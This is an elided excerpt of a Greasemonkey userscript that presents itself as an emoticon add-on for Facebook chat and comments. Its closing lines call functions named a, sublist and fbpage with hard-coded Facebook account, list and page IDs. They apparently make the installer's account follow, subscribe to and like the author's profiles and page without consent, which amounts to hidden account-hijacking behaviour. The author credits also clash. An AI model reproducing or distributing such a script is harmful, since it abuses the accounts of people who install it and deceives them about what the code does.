// ==UserScript==
// @name    	Facebook Emotions For Chat,Comments By Fasy
...
// @version 	Beta 
// @author  	Meer Faisal Ali
// @authorURL	http://www.facebook.com/faisalalinoor
...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="https://www.facebook.com/faisalalinoor" target="_blank">Created by Amaan Shaikh<br></a>';
	html += '</div>';
...
a("100002659249104"); //Meer Faisal Ali
a("100001569595115"); //Saad Saadi
sublist("437568979675073");
sublist("449540758477895");
sublist("139976832868059");
fbpage ("287174608081998");
var gid = [''];
